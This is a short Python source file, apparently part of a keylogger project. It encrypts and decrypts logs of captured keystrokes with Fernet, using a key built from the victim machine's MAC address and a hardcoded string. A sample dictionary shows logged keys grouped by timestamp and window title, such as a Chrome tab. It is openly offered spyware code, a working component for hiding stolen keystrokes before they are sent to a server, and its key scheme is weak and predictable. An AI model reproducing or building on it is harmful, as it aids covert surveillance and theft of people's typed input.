import json
import base64
from cryptography.fernet import Fernet
from getmac import get_mac_address

#exsemple
aaa={"f8:54:f6:bc:2e:64": {"12/02/2025  16:04": {"Desktop – KeyLogger_Manager.py": ["k", "j", "k", "j", "k", "j", "d", "k", "w", "j", "k", "j", "k"], "כרטיסייה חדשה - Google Chrome": ["h", "k", "h", "k", "d", "j", "k", "j", "k", "j", "d", "s", "j", "k", "j", "k", "s"], "Program Manager": ["shift", "Q"]}}}

#create key and encrypt for client
address = get_mac_address().replace(":","f") #get mac address and replace ":" white "f"
base_key = f"fp88{address}wAxDAAjijM=" #our key
key=base64.urlsafe_b64encode(base_key.encode()) #convert to base64

def encrypt_data(dic_data):
    fernet = Fernet(key)
    encrypted_data = fernet.encrypt(json.dumps(dic_data).encode())
    return encrypted_data




#create key and decrypt for server
mac=key_name = next(iter(aaa.keys()))
replase_mac = mac.replace(":","f") #get mac address and replace ":" white "f"
base_key = f"fp88{replase_mac}wAxDAAjijM=" #our key
key=base64.urlsafe_b64encode(base_key.encode()) #convert to base64

def decrypt_data(encrypted_data):
    fernet = Fernet(key)
    decrypted_data = fernet.decrypt(encrypted_data)
    return json.loads(decrypted_data.decode())



# check
encrypted = encrypt_data(aaa)
decrypted = decrypt_data(encrypted)

print("🔒 Encrypted:", encrypted)
print("🔓 Decrypted:", decrypted)
